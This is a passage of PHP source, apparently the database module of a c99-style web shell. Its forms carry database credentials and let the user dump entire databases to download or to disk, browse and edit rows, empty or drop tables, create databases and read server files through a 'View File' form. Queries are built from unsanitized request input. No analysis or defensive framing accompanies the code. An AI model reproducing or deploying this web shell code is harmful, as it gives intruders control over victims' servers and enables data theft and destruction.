height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;<?php
    if (!empty($sql_act)) {echo "&lt;hr size=\"1\" noshade&gt;";}
    if ($sql_act == "newtbl")
    {
     echo "&lt;b&gt;";
     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!&lt;/b&gt;&lt;br&gt;";
    }
    else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".&lt;br&gt;Reason:&lt;/b&gt; ".mysql_smarterror();}
   }
   elseif ($sql_act == "dump")
   {
    if (empty($submit))
    {
     $diplay = FALSE;
     echo "&lt;form method=\"POST\"&gt;&lt;input type=\"hidden\" name=\"act\" value=\"sql\"&gt;&lt;input type=\"hidden\" name=\"sql_act\" value=\"dump\"&gt;&lt;input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"&gt;&lt;input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"&gt;&lt;input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"&gt;&lt;input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"&gt;&lt;input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"&gt;&lt;input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;b&gt;SQL-Dump:&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
     echo "&lt;b&gt;DB:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\"&gt;&lt;br&gt;&lt;br&gt;";
     $v = join (";",$dmptbls);
     echo "&lt;b&gt;Only tables (explode \";\")&nbsp;&lt;b&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/b&gt;:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\"&gt;&lt;br&gt;&lt;br&gt;";
     if ($dump_file) {$tmp = $dump_file;}
     else {$tmp = htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");}
     echo "&lt;b&gt;File:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp) % 30)."\"&gt;&lt;br&gt;&lt;br&gt;";
     echo "&lt;b&gt;Download: &lt;/b&gt;&nbsp;&lt;input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked&gt;&lt;br&gt;&lt;br&gt;";
     echo "&lt;b&gt;Save to file: &lt;/b&gt;&nbsp;&lt;input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked&gt;";
     echo "&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Dump\"&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/b&gt; - all, if empty";
     echo "&lt;/form&gt;";
    }
    else
    {
     $diplay = TRUE;
     $set = array();
     $set["sock"] = $sql_sock;
     $set["db"] = $sql_db;
     $dump_out = "download";
     $set["print"] = 0;
     $set["nl2br"] = 0;
     $set[""] = 0;
     $set["file"] = $dump_file;
     $set["add_drop"] = TRUE;
     $set["onlytabs"] = array();
     if (!empty($dmptbls)) {$set["onlytabs"] = explode(";",$dmptbls);}
     $ret = mysql_dump($set);
     if ($sql_dump_download)
     {
      @ob_clean();
      header("Content-type: application/octet-stream");
      header("Content-length: ".strlen($ret));
      header("Content-disposition: attachment; filename=\"".basename($sql_dump_file)."\";");
      echo $ret;
      exit;
     }
     elseif ($sql_dump_savetofile)
     {
      $fp = fopen($sql_dump_file,"w");
      if (!$fp) {echo "&lt;b&gt;Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";}
      else
      {
       fwrite($fp,$ret);
       fclose($fp);
       echo "&lt;b&gt;Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")&lt;/b&gt;.";
      }
     }
     else {echo "&lt;b&gt;Dump: nothing to do!&lt;/b&gt;";}
    }
   }
   if ($diplay)
   {
    if (!empty($sql_tbl))
    {
     if (empty($sql_tbl_act)) {$sql_tbl_act = "browse";}
     $count = mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;");
     $count_row = mysql_fetch_array($count);
     mysql_free_result($count);
     $tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");
     $tbl_struct_fields = array();
     while ($row = mysql_fetch_assoc($tbl_struct_result)) {$tbl_struct_fields[] = $row;}
     if ($sql_ls &gt; $sql_le) {$sql_le = $sql_ls + $perpage;}
     if (empty($sql_tbl_page)) {$sql_tbl_page = 0;}
     if (empty($sql_tbl_ls)) {$sql_tbl_ls = 0;}
     if (empty($sql_tbl_le)) {$sql_tbl_le = 30;}
     $perpage = $sql_tbl_le - $sql_tbl_ls;
     if (!is_numeric($perpage)) {$perpage = 10;}
     $numpages = $count_row[0]/$perpage;
     $e = explode(" ",$sql_order);
     if (count($e) == 2)
     {
      if ($e[0] == "d") {$asc_desc = "DESC";}
      else {$asc_desc = "ASC";}
      $v = "ORDER BY `".$e[1]."` ".$asc_desc." ";
     }
     else {$v = "";}
     $query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";
     $result = mysql_query($query) or print(mysql_smarterror());
     echo "&lt;hr size=\"1\" noshade&gt;&lt;center&gt;&lt;b&gt;Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)&lt;/b&gt;&lt;/center&gt;";
     echo "&lt;a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_tbl_act.value='structure';document.sql.submit();\"&gt;[&nbsp;&lt;b&gt;Structure&lt;/b&gt;&nbsp;]&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
     echo "&lt;a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_tbl_act.value='browse';document.sql.submit();\"&gt;[&nbsp;&lt;b&gt;Browse&lt;/b&gt;&nbsp;]&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
     echo "&lt;a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_act.value='tbldump';document.sql.thistbl.value='1';document.sql.submit();\"&gt;[&nbsp;&lt;b&gt;Dump&lt;/b&gt;&nbsp;]&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
     echo "&lt;a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_tbl_act.value='insert';document.sql.thistbl.value='1';document.sql.submit();\"&gt;[&nbsp;&lt;b&gt;Insert&lt;/b&gt;&nbsp;]&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
     if ($sql_tbl_act == "structure") {echo "&lt;br&gt;&lt;br&gt;&lt;b&gt;Coming sooon!&lt;/b&gt;";}
     if ($sql_tbl_act == "insert")
     {
      if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();}
      if (!empty($sql_tbl_insert_radio))
      {

      }
      else
      {
       echo "&lt;br&gt;&lt;br&gt;&lt;b&gt;Inserting row into table:&lt;/b&gt;&lt;br&gt;";
       if (!empty($sql_tbl_insert_q))
       {
        $sql_query = "SELECT * FROM `".$sql_tbl."`";
        $sql_query .= " WHERE".$sql_tbl_insert_q;
        $sql_query .= " LIMIT 1;";
        $sql_query = urldecode($sql_query);
        $sql_tbl_insert_q = urldecode($sql_tbl_insert_q);
        $result = mysql_query($sql_query,$sql_sock) or print("&lt;br&gt;&lt;br&gt;".mysql_smarterror());
        $values = mysql_fetch_assoc($result);
        mysql_free_result($result);
       }
       else {$values = array();}
       echo "&lt;form method=\"POST\"&gt;&lt;input type=hidden name='sql_tbl_act' value='insert'&gt;&lt;input type=hidden name='sql_tbl_insert_q' value='".urlencode($sql_tbl_insert_q)."'&gt;&lt;input type=hidden name='sql_tbl_ls' value='".$sql_tbl_ls."'&gt;&lt;input type=hidden name='sql_tbl_le' value='".$sql_tbl_le."'&gt;&lt;input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"&gt;&lt;input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"&gt;&lt;input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"&gt;&lt;input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"&gt;&lt;input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"&gt;&lt;input type=\"hidden\" name=\"act\" value=\"sql\"&gt;&lt;TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Field&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Type&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Function&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Value&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";

       foreach ($tbl_struct_fields as $field)
       {
        $name = $field["Field"];
        if (empty($sql_tbl_insert_q)) {$v = "";}
        echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;".htmlspecialchars($name)."&lt;/b&gt;&lt;/td&gt;&lt;td&gt;".$field["Type"]."&lt;/td&gt;&lt;td&gt;&lt;select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"&gt;&lt;option value=\"\"&gt;&lt;/option&gt;&lt;option&gt;PASSWORD&lt;/option&gt;&lt;option&gt;MD5&lt;/option&gt;&lt;option&gt;ENCRYPT&lt;/option&gt;&lt;option&gt;ASCII&lt;/option&gt;&lt;option&gt;CHAR&lt;/option&gt;&lt;option&gt;RAND&lt;/option&gt;&lt;option&gt;LAST_INSERT_ID&lt;/option&gt;&lt;option&gt;COUNT&lt;/option&gt;&lt;option&gt;AVG&lt;/option&gt;&lt;option&gt;SUM&lt;/option&gt;&lt;option value=\"\"&gt;--------&lt;/option&gt;&lt;option&gt;SOUNDEX&lt;/option&gt;&lt;option&gt;LCASE&lt;/option&gt;&lt;option&gt;UCASE&lt;/option&gt;&lt;option&gt;NOW&lt;/option&gt;&lt;option&gt;CURDATE&lt;/option&gt;&lt;option&gt;CURTIME&lt;/option&gt;&lt;option&gt;FROM_DAYS&lt;/option&gt;&lt;option&gt;FROM_UNIXTIME&lt;/option&gt;&lt;option&gt;PERIOD_ADD&lt;/option&gt;&lt;option&gt;PERIOD_DIFF&lt;/option&gt;&lt;option&gt;TO_DAYS&lt;/option&gt;&lt;option&gt;UNIX_TIMESTAMP&lt;/option&gt;&lt;option&gt;USER&lt;/option&gt;&lt;option&gt;WEEKDAY&lt;/option&gt;&lt;option&gt;CONCAT&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50&gt;&lt;/td&gt;&lt;/tr&gt;";
        $i++;
       }
       echo "&lt;/table&gt;&lt;br&gt;";
       echo "&lt;input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "&gt;&lt;b&gt;Insert as new row&lt;/b&gt;";
       if (!empty($sql_tbl_insert_q)) {echo " or &lt;input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked&gt;&lt;b&gt;Save&lt;/b&gt;"; echo "&lt;input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\"&gt;";}
       echo "&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" value=\"Confirm\"&gt;&lt;/form&gt;";
      }
     }
     if ($sql_tbl_act == "browse")
     {
      $sql_tbl_ls = abs($sql_tbl_ls);
      $sql_tbl_le = abs($sql_tbl_le);
      echo "&lt;hr size=\"1\" noshade&gt;";
      $b = 0;
      for($i=0;$i&lt;$numpages;$i++)
      {
       if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "&lt;a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.thistbl.value='1';document.sql.sql_order.value='".htmlspecialchars($sql_order)."';document.sql.sql_tbl_ls.value='".($i*$perpage)."';document.sql.sql_tbl_le.value='".($i*$perpage+$perpage)."';document.sql.submit();\"&gt;&lt;u&gt;";}
       echo $i;
       if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "&lt;/u&gt;&lt;/a&gt;";}
       if (($i/30 == round($i/30)) and ($i &gt; 0)) {echo "&lt;br&gt;";}
       else {echo "&nbsp;";}
      }
      if ($i == 0) {echo "empty";}
      echo "&lt;form method=\"POST\"&gt;&lt;input type=\"hidden\" name=\"act\" value=\"sql\"&gt;&lt;input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"&gt;&lt;input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"&gt;&lt;input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"&gt;&lt;input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"&gt;&lt;input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"&gt;&lt;input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;input type=\"hidden\" name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\"&gt;&lt;b&gt;From:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\"&gt;&nbsp;&lt;b&gt;To:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\"&gt;&nbsp;&lt;input type=\"submit\" value=\"View\"&gt;&lt;/form&gt;";
      echo "&lt;br&gt;&lt;form method=\"POST\"&gt;&lt;TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;";
      echo "&lt;tr&gt;";
      echo "&lt;td&gt;&lt;input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"&gt;&lt;/td&gt;";
      for ($i=0;$i&lt;mysql_num_fields($result);$i++)
      {
       $v = mysql_field_name($result,$i);
       if ($e[0] == "a") {$s = "d"; $m = "asc";}
       else {$s = "a"; $m = "desc";}
       echo "&lt;td&gt;";
       if (empty($e[0])) {$e[0] = "a";}
       if ($e[1] != $v) {$sql_order="";$sql_order=$e[0]." ".$v;echo "&lt;a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_order.value='".$sql_order."';document.sql.sql_tbl_ls.value='".$sql_tbl_ls."';document.sql.sql_tbl_le.value='".$sql_tbl_le."';document.sql.submit();\"&gt;&lt;b&gt;".$v."&lt;/b&gt;&lt;/a&gt;";}
       else {echo "&lt;b&gt;".$v."&lt;/b&gt; &lt;a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_order.value='".$s."%20".$v."';document.sql.sql_tbl_ls.value='".$sql_tbl_ls."';document.sql.sql_tbl_le.value='".$sql_tbl_le."';document.sql.submit();\"&gt;&lt;font color=red&gt;\/&lt;/font&gt;&lt;/a&gt;";}
       echo "&lt;/td&gt;";
      }
      echo "&lt;td&gt;&lt;font color=\"green\"&gt;&lt;b&gt;Action&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;";
      echo "&lt;/tr&gt;";
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
      {
       echo "&lt;tr&gt;";
       $w = "";
       $i = 0;
       foreach ($row as $k=&gt;$v) {$name = mysql_field_name($result,$i); $w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;}
       if (count($row) &gt; 0) {$w = substr($w,0,strlen($w)-3);}
       echo "&lt;td&gt;&lt;input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\"&gt;&lt;/td&gt;";
       $i = 0;
       foreach ($row as $k=&gt;$v)
       {
        $v = htmlspecialchars($v);
        if ($v == "") {$v = "&lt;font color=\"green\"&gt;NULL&lt;/font&gt;";}
        echo "&lt;td&gt;".$v."&lt;/td&gt;";
        $i++;
       }
       echo "&lt;td&gt;";
       echo "&lt;a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_act.value='query';document.sql.sql_query.value='".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_tbl_ls.value='".$sql_tbl_ls."';document.sql.sql_tbl_le.value='".$sql_tbl_le."';document.sql.submit();\"&gt;&lt;b&gt;DEL&lt;/b&gt;&lt;/a&gt;&nbsp;";
       echo "&lt;a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl_act.value='insert';document.sql.sql_tbl_insert_q.value='".urlencode($w)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_tbl_ls.value='".$sql_tbl_ls."';document.sql.sql_tbl_le.value='".$sql_tbl_le."';document.sql.submit();\"&gt;&lt;b&gt;EDIT&lt;/b&gt;&lt;/a&gt;&nbsp;";
       echo "&lt;/td&gt;";
       echo "&lt;/tr&gt;";
      }
      mysql_free_result($result);
      echo "&lt;/table&gt;&lt;hr size=\"1\" noshade&gt;&lt;p align=\"left\"&gt;&lt;select name=\"sql_act\"&gt;";
      echo "&lt;option value=\"\"&gt;With selected:&lt;/option&gt;";
      echo "&lt;option value=\"deleterow\"&gt;Delete&lt;/option&gt;";
      echo "&lt;/select&gt;&nbsp;&lt;input type=\"submit\" value=\"Confirm\"&gt;&lt;/form&gt;&lt;/p&gt;";
     }
    }
    else
    {
     $result = mysql_query("SHOW TABLE STATUS", $sql_sock);
     if (!$result) {echo mysql_smarterror();}
     else
     {
      echo "&lt;br&gt;&lt;form method=\"POST\"&gt;&lt;input name='act' type='hidden' value='sql'&gt;&lt;input name='sql_login' type='hidden' value='".$sql_login."'&gt;&lt;input name='sql_server' type='hidden' value='".$sql_server."'&gt;&lt;input name='sql_port' type='hidden' value='".$sql_port."'&gt;&lt;input name='sql_db' type='hidden' value='".$sql_db."'&gt;&lt;input name='sql_passwd' type='hidden' value='".$sql_passwd."'&gt;&lt;TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td&gt;&lt;input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Table&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Rows&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Type&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Created&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Modified&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Size&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Action&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
      $i = 0;
      $tsize = $trows = 0;
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
      {
       $tsize += $row["Data_length"];
       $trows += $row["Rows"];
       $size = view_size($row["Data_length"]);
       echo "&lt;tr&gt;";
       echo "&lt;td&gt;&lt;input type=\"checkbox\" name=\"boxtbl[]\" value=\"".$row["Name"]."\"&gt;&lt;/td&gt;";

       echo "&lt;td&gt;&nbsp;&lt;a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($row["Name"])."';document.sql.submit();\"&gt;&lt;b&gt;".$row["Name"]."&lt;/b&gt;&lt;/a&gt;&nbsp;&lt;/td&gt;";
       echo "&lt;td&gt;".$row["Rows"]."&lt;/td&gt;";
       echo "&lt;td&gt;".$row["Type"]."&lt;/td&gt;";
       echo "&lt;td&gt;".$row["Create_time"]."&lt;/td&gt;";
       echo "&lt;td&gt;".$row["Update_time"]."&lt;/td&gt;";
       echo "&lt;td&gt;".$size."&lt;/td&gt;";

       echo "&lt;td&gt;&nbsp;&lt;a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_act.value='query';document.sql.sql_query.value='".urlencode("DELETE FROM `".$row["Name"]."`")."';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.submit();\"&gt;&lt;b&gt;EMPT&lt;/b&gt;&lt;/a&gt;&nbsp;&nbsp;&lt;a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_act.value='query';document.sql.sql_query.value='".urlencode("DROP TABLE `".$row["Name"]."`")."';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.submit();\"&gt;&lt;b&gt;DROP&lt;/b&gt;&lt;/a&gt;&nbsp;&lt;a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_tbl.value='".$row["Name"]."';document.sql.sql_tbl_act.value='insert';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.submit();\"&gt;&lt;b&gt;INS&lt;/b&gt;&lt;/a&gt;&nbsp;&lt;/td&gt;";
       echo "&lt;/tr&gt;";
       $i++;
      }
      echo "&lt;tr bgcolor=\"000000\"&gt;";
      echo "&lt;td&gt;&lt;center&gt;&lt;b&gt;&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;";
      echo "&lt;td&gt;&lt;center&gt;&lt;b&gt;".$i." table(s)&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;";
      echo "&lt;td&gt;&lt;b&gt;".$trows."&lt;/b&gt;&lt;/td&gt;";
      echo "&lt;td&gt;".$row[1]."&lt;/td&gt;";
      echo "&lt;td&gt;".$row[10]."&lt;/td&gt;";
      echo "&lt;td&gt;".$row[11]."&lt;/td&gt;";
      echo "&lt;td&gt;&lt;b&gt;".view_size($tsize)."&lt;/b&gt;&lt;/td&gt;";
      echo "&lt;td&gt;&lt;/td&gt;";
      echo "&lt;/tr&gt;";
      echo "&lt;/table&gt;&lt;hr size=\"1\" noshade&gt;&lt;p align=\"right\"&gt;&lt;select name=\"sql_act\"&gt;";
      echo "&lt;option value=\"\"&gt;With selected:&lt;/option&gt;";
      echo "&lt;option value=\"tbldrop\"&gt;Drop&lt;/option&gt;";
      echo "&lt;option value=\"tblempty\"&gt;Empty&lt;/option&gt;";
      echo "&lt;option value=\"tbldump\"&gt;Dump&lt;/option&gt;";
      echo "&lt;option value=\"tblcheck\"&gt;Check table&lt;/option&gt;";
      echo "&lt;option value=\"tbloptimize\"&gt;Optimize table&lt;/option&gt;";
      echo "&lt;option value=\"tblrepair\"&gt;Repair table&lt;/option&gt;";
      echo "&lt;option value=\"tblanalyze\"&gt;Analyze table&lt;/option&gt;";
      echo "&lt;/select&gt;&nbsp;&lt;input type=\"submit\" value=\"Confirm\"&gt;&lt;/form&gt;&lt;/p&gt;";
      mysql_free_result($result);
     }
    }
   }
   }
  }
  else
  {
   $acts = array("","newdb","serverstatus","servervars","processes","getfile");
   if (in_array($sql_act,$acts)) {?>&lt;table border="0" width="100%" height="1"&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Create new DB:&lt;/b&gt;&lt;form method="POST"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="newdb"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="sql_newdb" size="20"&gt;&nbsp;&lt;input type="submit" value="Create"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;View File:&lt;/b&gt;&lt;form method="POST"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="getfile"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>"&gt;&nbsp;&lt;input type="submit" value="Get"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;<?php }
   if (!empty($sql_act))
   {
    echo "&lt;hr size=\"1\" noshade&gt;";
    if ($sql_act == "newdb")
    {
     echo "&lt;b&gt;";
